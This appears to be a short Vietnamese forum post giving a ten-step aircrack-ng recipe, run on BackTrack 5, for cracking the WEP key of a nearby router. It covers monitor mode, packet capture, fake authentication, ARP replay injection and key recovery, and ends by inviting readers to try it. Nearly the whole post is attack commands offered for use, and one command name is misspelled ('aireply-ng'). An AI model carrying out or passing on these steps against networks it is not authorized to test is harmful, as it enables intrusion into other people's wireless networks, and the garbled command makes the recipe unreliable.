1. airmon-ng
2. airmon-ng start wlan0
3. airodump-ng mon0
4. Copy MAC router
5. airodump-ng -c (channel) -w (tên file) --bssid (MAC router) mon0
6. Open new window code: aireplay-ng -1 0 -a (BSSID) mon0
7. aireply-ng -2 -p 0841 -c ff:ff:ff:ff:ff:ff -b (BSSID) mon0
8. Press y to start
9. Open new window code: aircrack-ng -n 64 -b (BSSID) wep*.cap
10. Key found. Ok

Bạn thử nhé. Card wifi của mình không hỗ trợ windows nên chục chặc khi chạy với vmware. Nếu vướng mắc phần nào, hãy để lại lời nhắn. Công cụ mình sử dụng là BT5.
